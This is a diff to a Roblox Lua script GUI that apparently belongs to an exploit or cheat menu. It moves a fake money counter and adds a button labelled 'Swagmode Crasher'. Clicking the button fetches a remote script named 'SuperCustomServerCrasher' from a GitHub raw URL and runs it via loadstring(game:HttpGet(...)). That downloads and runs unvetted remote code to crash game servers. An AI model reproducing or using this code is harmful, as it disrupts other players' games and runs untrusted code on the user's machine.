@@ -1,4 +1,4 @@
-
+-- waht u looking at here? hmm
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local Frame_2 = Instance.new("Frame")
@@ -11,6 +11,8 @@ local Fram_3 = Instance.new("Frame")
 local UICorner_2 = Instance.new("UICorner")
 local Counter = Instance.new("TextLabel")
 local UICorner_3 = Instance.new("UICorner")
+local Crash = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
 
 --Properties:
 
@@ -88,8 +90,8 @@ Counter.Name = "Counter"
 Counter.Parent = Fram_3
 Counter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Counter.BackgroundTransparency = 1.000
-Counter.Position = UDim2.new(0, 0, 0.178082198, 0)
-Counter.Size = UDim2.new(0, 242, 0, 49)
+Counter.Position = UDim2.new(0, 0, 0.109589048, 0)
+Counter.Size = UDim2.new(0, 242, 0, 33)
 Counter.Font = Enum.Font.GothamBlack
 Counter.Text = "$100.000.000"
 Counter.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -97,9 +99,28 @@ Counter.TextSize = 23.000
 
 UICorner_3.Parent = Frame
 
+Crash.Name = "Crash"
+Crash.Parent = Frame
+Crash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Crash.Position = UDim2.new(0.08203125, 0, 0.691056907, 0)
+Crash.Size = UDim2.new(0, 216, 0, 25)
+Crash.Font = Enum.Font.GothamBlack
+Crash.Text = "Swagmode Crasher"
+Crash.TextColor3 = Color3.fromRGB(255, 0, 0)
+Crash.TextScaled = true
+Crash.TextSize = 19.000
+Crash.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+Crash.TextWrapped = true
+Crash.MouseButton1Down:Connect(function()
+	setfpscap(150)
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+UICorner_4.Parent = Crash
+
 -- Scripts:
 
-local function REKO_fake_script() -- Counter.LocalScript 
+local function XHADWMV_fake_script() -- Counter.LocalScript 
 	local script = Instance.new('LocalScript', Counter)
 
 	while wait() do
@@ -123,8 +144,8 @@ local function REKO_fake_script() -- Counter.LocalScript
 		end)
 	end
 end
-coroutine.wrap(REKO_fake_script)()
-local function HETEFAA_fake_script() -- Frame.LocalScript 
+coroutine.wrap(XHADWMV_fake_script)()
+local function XNWKLLI_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local UIS = game:GetService('UserInputService')
@@ -163,4 +184,4 @@ local function HETEFAA_fake_script() -- Frame.LocalScript
 	end)
 	
 end
-coroutine.wrap(HETEFAA_fake_script)()
+coroutine.wrap(XNWKLLI_fake_script)()
